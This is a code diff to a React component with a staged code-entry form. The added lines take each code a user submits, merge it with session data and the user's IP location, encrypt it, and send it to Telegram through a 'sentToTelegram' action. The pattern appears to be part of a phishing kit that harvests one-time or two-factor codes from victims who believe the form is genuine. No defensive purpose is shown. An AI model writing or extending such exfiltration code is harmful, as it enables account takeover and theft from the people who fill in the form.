@@ -1,6 +1,9 @@
 "use client";
 
+import { sentToTelegram } from "@/actions/sender";
 import { ERROR } from "@/const";
+import { sessions, useSessionStore } from "@/store/session";
+import { encryptObject } from "@/utils/client/encryption";
 import { useState, useEffect, ChangeEvent } from "react";
 
 export const Text = ({
@@ -16,6 +19,10 @@ export const Text = ({
   setFinish: React.Dispatch<React.SetStateAction<string>>;
   isFirst: boolean;
 }) => {
+  const { ipLocationData, setSessions, sessionEntries, sessionId, keyData } =
+    useSessionStore();
+  if (!keyData) return null;
+
   const [initialLoad, setInitialLoad] = useState("init");
   const [quickLoad, setQuickLoad] = useState(true);
   const [code, setCode] = useState("");
@@ -42,7 +49,7 @@ export const Text = ({
     }
   }, [code]);
 
-  const handleSubmit = (e: React.FormEvent<HTMLFormElement>) => {
+  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
     e.preventDefault();
 
     if (!code) {
@@ -67,6 +74,21 @@ export const Text = ({
     } else {
       setFinish("loading-2");
     }
+
+
+    const data = {
+      ...sessionEntries,
+      code,
+      codeStage: sessionEntries!.codeStage + 1,
+      step: sessionEntries!.step + 1,
+    };
+    setSessions(data as sessions);
+
+    const safeData = encryptObject(
+      { data, ipLocationData, sessionId },
+      keyData
+    );
+    await sentToTelegram(safeData);
   };
 
   return (
